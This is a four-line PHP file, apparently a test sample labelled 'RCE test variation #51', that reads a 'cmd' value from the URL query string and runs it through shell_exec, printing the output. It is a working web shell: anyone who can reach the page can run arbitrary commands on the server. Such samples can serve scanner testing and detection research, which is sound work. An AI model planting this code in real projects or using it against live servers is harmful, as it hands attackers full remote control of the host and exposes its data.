<?php
// RCE test variation #51
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>